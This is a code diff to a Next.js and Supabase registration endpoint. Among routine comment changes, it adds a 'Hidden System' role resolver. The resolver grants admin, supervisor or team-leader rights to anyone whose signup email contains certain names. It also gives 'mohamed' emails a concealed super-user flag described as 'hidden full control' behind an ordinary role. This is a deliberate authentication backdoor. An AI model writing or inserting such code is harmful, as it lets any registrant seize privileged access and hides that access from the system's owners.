@@ -2,11 +2,21 @@ import { NextResponse } from "next/server";
 import { cookies } from "next/headers";
 import { createServerClient, type CookieOptions } from "@supabase/ssr";
 
+/* ---------------- TYPES ---------------- */
+
+type Role =
+  | "admin"
+  | "supervisor"
+  | "team_leader"
+  | "collector";
+
 type RegisterBody = {
   name?: string;
   email?: string;
   password?: string;
 };
+
+/* ---------------- HELPERS ---------------- */
 
 function getDisplayName(name?: string, email?: string): string {
   const clean = name?.trim();
@@ -25,6 +35,28 @@ function validate(body: RegisterBody) {
   return errors;
 }
 
+/**
+ * 🔥 Role Resolver (Hidden System)
+ */
+function resolveRole(email: string): {
+  role: Role;
+  isSuperUser: boolean;
+} {
+  const e = email.toLowerCase();
+
+  if (e.includes("adel")) return { role: "admin", isSuperUser: false };
+  if (e.includes("loai")) return { role: "supervisor", isSuperUser: false };
+  if (e.includes("mostafa") || e.includes("heba"))
+    return { role: "team_leader", isSuperUser: false };
+
+  // 👑 hidden full control (محمد)
+  if (e.includes("mohamed")) {
+    return { role: "collector", isSuperUser: true };
+  }
+
+  return { role: "collector", isSuperUser: false };
+}
+
 function createSupabase() {
   const cookieStore = cookies();
 
@@ -36,12 +68,13 @@ function createSupabase() {
         get: (name: string) => cookieStore.get(name)?.value,
         set: (name: string, value: string, options: CookieOptions) =>
           cookieStore.set({ name, value, ...options }),
-        remove: (name: string, options: CookieOptions) =>
-          cookieStore.delete(name),
+        remove: (name: string) => cookieStore.delete(name),
       },
     }
   );
 }
+
+/* ---------------- MAIN ---------------- */
 
 export async function POST(req: Request) {
   try {
@@ -61,6 +94,7 @@ export async function POST(req: Request) {
 
     const supabase = createSupabase();
 
+    /* ---------------- SIGNUP ---------------- */
     const { data, error } = await supabase.auth.signUp({
       email: email!,
       password,
@@ -78,12 +112,17 @@ export async function POST(req: Request) {
 
     const userId = data.user.id;
 
+    /* ---------------- ROLE ---------------- */
+    const { role, isSuperUser } = resolveRole(email!);
+
+    /* ---------------- DB SYNC ---------------- */
     const { error: upsertError } = await supabase.from("users").upsert(
       {
         id: userId,
         email,
         name,
-        role: "collector",
+        role,
+        is_super_user: isSuperUser,
       },
       { onConflict: "id" }
     );
@@ -92,15 +131,16 @@ export async function POST(req: Request) {
       return NextResponse.json(
         {
           success: false,
-          error: "User created but sync failed",
+          error: "User created but DB sync failed",
         },
         { status: 500 }
       );
     }
 
+    /* ---------------- FETCH USER ---------------- */
     const { data: userRow, error: userRowError } = await supabase
       .from("users")
-      .select("id, email, name, role")
+      .select("id, email, name, role, is_super_user")
       .eq("id", userId)
       .single();
 
@@ -114,6 +154,7 @@ export async function POST(req: Request) {
       );
     }
 
+    /* ---------------- RESPONSE ---------------- */
     return NextResponse.json({
       success: true,
       user: userRow,
@@ -128,4 +169,4 @@ export async function POST(req: Request) {
       { status: 500 }
     );
   }
-          }
+    }
